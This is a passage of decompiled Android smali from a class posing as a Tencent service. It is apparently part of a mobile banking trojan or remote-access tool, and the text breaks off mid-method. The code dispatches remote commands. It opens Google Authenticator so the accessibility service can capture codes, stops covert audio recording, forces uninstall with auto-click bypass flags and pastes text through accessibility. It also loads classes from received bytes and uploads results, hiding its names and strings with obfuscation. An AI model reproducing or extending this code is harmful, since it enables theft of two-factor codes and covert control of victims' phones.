.class public Lcom/tencent/PersistentService$ta;
.super Landroid/os/AsyncTask;
.source "entitledoswimmingo21.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/tencent/PersistentService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x9
    name = "ta"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Landroid/content/Context;",
        "Ljava/lang/Integer;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 137
    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    .line 137
    check-cast p1, [Landroid/content/Context;

    invoke-virtual {p0, p1}, Lcom/tencent/PersistentService$ta;->doInBackground([Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method protected varargs doInBackground([Landroid/content/Context;)Ljava/lang/String;
    .locals 19

    const-string v0, "ssms<*>"

    const-string v1, "msg:"

    const-string v2, "\t"

    :catch_0
    :goto_0
    const/4 v3, 0x3

    const/4 v4, 0x2

    const/4 v5, 0x0

    const/4 v6, 0x1

    .line 150
    :try_start_0
    sget-boolean v7, Lcom/tencent/DataEncryptionEngine;->ec_tunesxconcerningn102_ho:Z

    const-wide/16 v8, -0x1

    if-ne v7, v6, :cond_3

    .line 151
    sget-wide v10, Lcom/tencent/MainBackgroundService;->e_tunesxconcerningn1011_co:J

    cmp-long v7, v10, v8

    if-nez v7, :cond_0

    .line 152
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v7

    const-wide/32 v9, 0xafc8

    add-long/2addr v7, v9

    sput-wide v7, Lcom/tencent/MainBackgroundService;->e_tunesxconcerningn1011_co:J

    goto :goto_2

    .line 154
    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v10

    sget-wide v12, Lcom/tencent/MainBackgroundService;->e_tunesxconcerningn1011_co:J

    cmp-long v7, v10, v12

    if-lez v7, :cond_4

    .line 155
    sget-object v7, Lcom/tencent/DataPackagingEngine;->dt:Ljava/lang/String;

    .line 156
    sget v10, Lcom/tencent/MainBackgroundService;->inx:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    if-ne v10, v4, :cond_1

    move-object v7, v2

    .line 162
    :cond_1
    :try_start_1
    sget-object v10, Lcom/tencent/DataPackagingEngine;->j_tunesxconcerningn103_z:Ljava/lang/String;

    invoke-virtual {v7}, Ljava/lang/String;->getBytes()[B

    move-result-object v7

    invoke-static {v10, v7}, Lcom/tencent/DataEncryptionEngine;->agreeltimelybfacilitatez38(Ljava/lang/String;[B)V

    .line 163
    invoke-static {}, Lcom/tencent/DataEncryptionEngine;->ox()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 165
    :catch_1
    :try_start_2
    sget v7, Lcom/tencent/MainBackgroundService;->inx:I

    if-lt v7, v3, :cond_2

    const/4 v7, -0x1

    .line 166
    sput v7, Lcom/tencent/MainBackgroundService;->inx:I

    const-string v7, "DONE"

    .line 169
    invoke-static {v7}, Lcom/tencent/DataEncryptionEngine;->CLOSEALLINTENT(Ljava/lang/String;)V

    goto :goto_1

    .line 171
    :cond_2
    sget v7, Lcom/tencent/MainBackgroundService;->inx:I

    add-int/2addr v7, v6

    sput v7, Lcom/tencent/MainBackgroundService;->inx:I

    .line 173
    :goto_1
    sput-wide v8, Lcom/tencent/MainBackgroundService;->e_tunesxconcerningn1011_co:J

    goto :goto_2

    .line 177
    :cond_3
    sput-wide v8, Lcom/tencent/MainBackgroundService;->e_tunesxconcerningn1011_co:J

    .line 178
    sget-object v7, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    if-eqz v7, :cond_4

    .line 180
    sget-object v7, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    sget-boolean v7, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Recording:Z

    if-eqz v7, :cond_4

    .line 182
    sget-object v7, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    sput-boolean v5, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Recording:Z

    .line 183
    sget-object v7, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    sget-object v7, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012mRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v7}, Landroid/media/MediaRecorder;->stop()V

    .line 184
    sget-object v7, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    sput-boolean v5, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012RecorderActive:Z

    .line 185
    sget-object v7, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    sget-object v7, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012mRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v7}, Landroid/media/MediaRecorder;->release()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 193
    :catch_2
    :cond_4
    :goto_2
    :try_start_3
    sget-object v7, Lcom/tencent/MainBackgroundService;->L_tunesxconcerningn1011_i:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->size()I

    move-result v7

    if-lez v7, :cond_38

    .line 194
    sget-object v7, Lcom/tencent/MainBackgroundService;->L_tunesxconcerningn1011_i:Ljava/util/List;

    invoke-interface {v7, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Lcom/tencent/InstalledAppsScanner;

    if-eqz v7, :cond_36

    .line 196
    iget-object v8, v7, Lcom/tencent/InstalledAppsScanner;->str:Ljava/lang/String;

    sget-object v9, Lcom/tencent/MainBackgroundService;->yrfjertunesxconcerningn1011SERBRE:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v8

    .line 197
    aget-object v9, v8, v5

    const-string v10, "0"

    .line 198
    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    const/16 v14, 0xc

    const/16 v15, 0xb

    const/16 v16, 0x9

    const/16 v17, 0x7

    const/16 v13, 0x8

    const/4 v11, 0x6

    const/4 v12, 0x5

    const/16 v18, 0x4

    if-eqz v10, :cond_5

    new-array v9, v12, [Ljava/lang/Object;

    .line 200
    aget-object v10, p1, v5

    aput-object v10, v9, v5

    iget-object v7, v7, Lcom/tencent/InstalledAppsScanner;->byt:[B

    aput-object v7, v9, v6

    aget-object v7, v8, v6

    aput-object v7, v9, v4

    aget-object v7, v8, v18

    aput-object v7, v9, v3

    const-string v7, "\u0559X\ufe76YYhypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41\u03c6T\u02beXX\u0559Y\ufe76VChypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41W\u03c6X\u02be"

    aput-object v7, v9, v18

    invoke-static {v9}, Lcom/tencent/BackgroundServiceHelper;->lidetypesbscreensa17([Ljava/lang/Object;)Ljava/lang/Class;

    move-result-object v7

    .line 201
    new-instance v9, Lcom/tencent/tunesxconcerningn100;

    invoke-virtual {v7}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10, v7}, Lcom/tencent/tunesxconcerningn100;-><init>(Ljava/lang/String;Ljava/lang/Class;)V

    .line 202
    sget-object v7, Lcom/tencent/MainBackgroundService;->L_tunesxconcerningn1011_cl:Ljava/util/List;

    invoke-interface {v7, v9}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 203
    sget-object v7, Lcom/tencent/MainBackgroundService;->L_tunesxconcerningn1011_cl:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->size()I

    move-result v7

    aget-object v9, v8, v4

    invoke-static {v9}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/Integer;->intValue()I

    move-result v9

    if-ne v7, v9, :cond_36

    .line 204
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v9, v8, v12

    aput-object v9, v7, v5

    .line 206
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v9, v8, v11

    aput-object v9, v7, v18

    .line 207
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v9, v8, v17

    aput-object v9, v7, v12
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_3 .. :try_end_3} :catch_0

    .line 212
    :try_start_4
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v9, v8, v13

    aput-object v9, v7, v11

    .line 213
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v9, v8, v16

    aput-object v9, v7, v17

    .line 214
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    const/16 v9, 0xa

    aget-object v9, v8, v9

    aput-object v9, v7, v13
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3
    .catch Ljava/lang/OutOfMemoryError; {:try_start_4 .. :try_end_4} :catch_0

    .line 217
    :catch_3
    :try_start_5
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v9, v8, v15

    aput-object v9, v7, v16

    .line 218
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v9, v8, v14

    const/16 v10, 0xa

    aput-object v9, v7, v10

    .line 219
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    const/16 v9, 0xd

    aget-object v10, v8, v9

    aput-object v10, v7, v15

    .line 221
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    const/16 v9, 0xe

    aget-object v10, v8, v9

    aput-object v10, v7, v14

    .line 222
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    const/16 v9, 0xf

    aget-object v10, v8, v9

    const/16 v11, 0xd

    aput-object v10, v7, v11

    .line 224
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    const/16 v10, 0x10

    aget-object v11, v8, v10

    const/16 v10, 0xe

    aput-object v11, v7, v10

    .line 225
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    const/16 v10, 0x11

    aget-object v10, v8, v10

    aput-object v10, v7, v9

    .line 226
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    const/16 v10, 0x12

    aget-object v10, v8, v10

    const/16 v11, 0x10

    aput-object v10, v7, v11

    .line 228
    sget-object v7, Lcom/tencent/MainBackgroundService;->L_tunesxconcerningn1011_cl:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->size()I

    move-result v7

    sput v7, Lcom/tencent/MainBackgroundService;->p_tunesxconcerningn1011_lg:I

    new-array v4, v4, [Ljava/lang/Object;

    .line 229
    aget-object v7, p1, v5

    aput-object v7, v4, v5

    aget-object v3, v8, v3

    aput-object v3, v4, v6

    invoke-static {v4}, Lcom/tencent/BackgroundServiceHelper;->welljweredextzhollyh19([Ljava/lang/Object;)V

    const-wide/16 v3, 0xa

    .line 230
    sput-wide v3, Lcom/tencent/DataEncryptionEngine;->s_tunesxconcerningn102_s:J

    .line 231
    sget-object v3, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v3, v3, v9

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-static {v3, v4}, Lcom/tencent/DataEncryptionEngine;->agreeltimelybfacilitatez38(Ljava/lang/String;[B)V

    goto/16 :goto_7

    .line 237
    :cond_5
    sget-object v10, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v10, v10, v18

    invoke-static {v9, v10}, Lcom/tencent/DataPackagingEngine;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v10

    if-eqz v10, :cond_7

    .line 238
    sget-object v9, Lcom/tencent/MainBackgroundService;->L_tunesxconcerningn1011_cl:Ljava/util/List;

    invoke-interface {v9}, Ljava/util/List;->size()I

    move-result v9

    if-lez v9, :cond_36

    move v9, v5

    .line 239
    :goto_3
    sget-object v10, Lcom/tencent/MainBackgroundService;->L_tunesxconcerningn1011_cl:Ljava/util/List;

    invoke-interface {v10}, Ljava/util/List;->size()I

    move-result v10

    if-gt v9, v10, :cond_36

    .line 240
    sget-object v10, Lcom/tencent/MainBackgroundService;->L_tunesxconcerningn1011_cl:Ljava/util/List;

    invoke-interface {v10, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Lcom/tencent/tunesxconcerningn100;

    iget-object v10, v10, Lcom/tencent/tunesxconcerningn100;->Datahelp:Ljava/lang/String;

    aget-object v13, v8, v6

    invoke-virtual {v10, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_6

    const-string v10, "\u02bc\u02be\u02bf\u02c8\u1d54\u0999\u02bf$\u02bf\u02bc"

    new-array v11, v11, [Ljava/lang/Object;

    .line 241
    aget-object v13, p1, v5

    aput-object v13, v11, v5

    sget-object v13, Lcom/tencent/MainBackgroundService;->L_tunesxconcerningn1011_cl:Ljava/util/List;

    invoke-interface {v13, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Lcom/tencent/tunesxconcerningn100;

    iget-object v9, v9, Lcom/tencent/tunesxconcerningn100;->jasonalfa:Ljava/lang/Class;

    aput-object v9, v11, v6

    aget-object v6, v8, v4

    aput-object v6, v11, v4

    aget-object v4, v8, v18

    aput-object v4, v11, v3

    iget-object v4, v7, Lcom/tencent/InstalledAppsScanner;->byt:[B

    aput-object v4, v11, v18

    const-string v4, "\u02bc\u02be\u02bf\u02c8\u1d54\u0999\u02bf$\u02bf\u02bc"

    aput-object v4, v11, v12

    invoke-static {v10, v11}, Lcom/tencent/BackgroundServiceHelper;->observetgadgetss18(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    .line 242
    aget-object v6, v8, v3

    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    const/16 v10, 0x10

    aget-object v7, v7, v10

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_5 .. :try_end_5} :catch_0

    if-nez v6, :cond_36

    .line 244
    :try_start_6
    aget-object v3, v8, v3

    invoke-static {v4}, Lcom/tencent/DataPackagingEngine;->get_tunesxconcerningn103_Bytes(Ljava/lang/Object;)[B

    move-result-object v4

    invoke-static {v3, v4}, Lcom/tencent/DataEncryptionEngine;->agreeltimelybfacilitatez38(Ljava/lang/String;[B)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_6 .. :try_end_6} :catch_0

    goto/16 :goto_7

    :cond_6
    const/16 v10, 0x10

    add-int/lit8 v9, v9, 0x1

    goto :goto_3

    .line 254
    :cond_7
    :try_start_7
    sget-object v7, Lcom/tencent/MainBackgroundService;->c_tunesxconcerningn1011_mn:[Ljava/lang/String;

    aget-object v7, v7, v12

    invoke-static {v9, v7}, Lcom/tencent/DataPackagingEngine;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_2e

    new-array v7, v13, [Ljava/lang/String;

    .line 256
    aget-object v9, v8, v6

    aput-object v9, v7, v5

    aget-object v9, v8, v4

    aput-object v9, v7, v6

    aget-object v9, v8, v3

    aput-object v9, v7, v4

    aget-object v9, v8, v18

    aput-object v9, v7, v3

    aget-object v3, v8, v12

    aput-object v3, v7, v18

    aget-object v3, v8, v11

    aput-object v3, v7, v12

    aget-object v3, v8, v17

    aput-object v3, v7, v11

    aget-object v3, v8, v13

    aput-object v3, v7, v17

    .line 257
    aget-object v3, v8, v18

    const-string v9, "ddll"

    invoke-virtual {v3, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    const/high16 v9, 0x10000000

    if-eqz v3, :cond_2c

    .line 259
    aget-object v3, v8, v6

    invoke-virtual {v3, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_7 .. :try_end_7} :catch_0

    const-string v7, ""

    if-eqz v3, :cond_a

    .line 262
    :try_start_8
    aget-object v3, v8, v6

    const-string v4, ":up"

    invoke-virtual {v3, v4}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_8

    .line 264
    new-instance v3, Lcom/tencent/MiscHelper;

    invoke-direct {v3}, Lcom/tencent/MiscHelper;-><init>()V

    .line 265
    sget-object v4, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    new-array v9, v6, [Ljava/lang/String;

    aget-object v6, v8, v6

    invoke-virtual {v6, v1, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    const-string v8, ":up"

    invoke-virtual {v6, v8, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v9, v5

    invoke-virtual {v3, v4, v9}, Lcom/tencent/MiscHelper;->setContext(Landroid/content/Context;[Ljava/lang/String;)V

    goto/16 :goto_7

    .line 267
    :cond_8
    aget-object v3, v8, v6

    const-string v4, ":fsh"

    invoke-virtual {v3, v4}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_9

    .line 268
    aget-object v3, v8, v6

    invoke-virtual {v3, v1, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ":fsh"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/tencent/PersistentService;->FPPAGE(Ljava/lang/String;)V

    goto/16 :goto_7

    .line 273
    :cond_9
    aget-object v3, v8, v6

    invoke-virtual {v3, v1, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/tencent/PersistentService;->showToast(Ljava/lang/String;)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_8 .. :try_end_8} :catch_0

    goto/16 :goto_7

    .line 280
    :cond_a
    :try_start_9
    aget-object v3, v8, v6

    const-string v10, "goauth<*>"

    invoke-virtual {v3, v10}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_9 .. :try_end_9} :catch_0

    if-eqz v3, :cond_c

    :try_start_a
    const-string v3, "co#$m.goo#$gle.andr#$oid.ap#$ps.authent#$icator2"

    const-string v4, "#$"

    .line 285
    invoke-static {v3, v4}, Lcom/tencent/DataPackagingEngine;->deljapproximatelyy39(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    aget-object v4, p1, v5

    invoke-virtual {v4}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    invoke-static {v3, v4}, Lcom/tencent/MainLauncherActivity;->IP_tunesxconcerningn109_I(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v3

    if-eqz v3, :cond_b

    .line 287
    sput-boolean v6, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012SendGoogleAuth:Z

    .line 288
    aget-object v3, p1, v5

    invoke-virtual {v3}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    const-string v4, "co#$m.goo#$gle.andr#$oid.ap#$ps.authent#$icator2"

    const-string v6, "#$"

    .line 289
    invoke-static {v4, v6}, Lcom/tencent/DataPackagingEngine;->deljapproximatelyy39(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v3

    .line 290
    invoke-virtual {v3, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 292
    aget-object v4, p1, v5

    invoke-virtual {v4, v3}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_7

    .line 296
    :cond_b
    sget-object v3, Lcom/tencent/DataPackagingEngine;->s_tunesxconcerningn103_fh:Ljava/lang/String;

    const-string v4, "Google Auth<app not installed<app not installed"

    invoke-virtual {v4}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-static {v3, v4}, Lcom/tencent/DataEncryptionEngine;->agreeltimelybfacilitatez38(Ljava/lang/String;[B)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_a .. :try_end_a} :catch_0

    goto/16 :goto_7

    .line 303
    :cond_c
    :try_start_b
    aget-object v3, v8, v6

    const-string v10, "rmv<*>"

    invoke-virtual {v3, v10}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_b .. :try_end_b} :catch_0

    if-eqz v3, :cond_d

    .line 305
    :try_start_c
    new-instance v3, Landroid/content/Intent;

    const-string v4, "android.intent.action.UNINSTALL_PACKAGE"

    invoke-direct {v3, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 306
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "package:"

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v7, p1, v5

    invoke-virtual {v7}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    invoke-virtual {v3, v4}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    const-string v4, "android.intent.extra.RETURN_RESULT"

    .line 307
    invoke-virtual {v3, v4, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    .line 308
    invoke-virtual {v3, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 309
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012Auto_Click:Ljava/lang/Boolean;

    .line 310
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lcom/tencent/AccessibilityServiceCore;->FOR_REM:Ljava/lang/Boolean;

    .line 311
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    sput-object v4, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012bypass:Ljava/lang/Boolean;

    .line 312
    aget-object v4, p1, v5

    invoke-virtual {v4, v3}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_c .. :try_end_c} :catch_0

    goto/16 :goto_7

    .line 318
    :cond_d
    :try_start_d
    aget-object v3, v8, v6

    const-string v9, "kill<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_d .. :try_end_d} :catch_0

    if-eqz v3, :cond_e

    :try_start_e
    const-string v3, "off"

    .line 320
    sput-object v3, Lcom/tencent/MainBackgroundService;->uninstall:Ljava/lang/String;
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_6
    .catch Ljava/lang/OutOfMemoryError; {:try_start_e .. :try_end_e} :catch_0

    goto/16 :goto_7

    .line 325
    :cond_e
    :try_start_f
    aget-object v3, v8, v6

    const-string v9, "srec<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_f

    goto/16 :goto_7

    .line 327
    :cond_f
    aget-object v3, v8, v6

    const-string v9, "pst<*>"

    invoke-virtual {v3, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_f .. :try_end_f} :catch_0

    if-eqz v3, :cond_10

    .line 330
    :try_start_10
    sget-object v3, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    if-eqz v3, :cond_36

    .line 333
    sget-object v3, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

    aget-object v3, v8, v6

    const-string v4, "pst<*>"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    sput-object v3, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012ToPaste:Ljava/lang/String;

    .line 334
    sget-object v3, Lcom/tencent/MainBackgroundService;->MyAccess:Lcom/tencent/AccessibilityServiceCore;

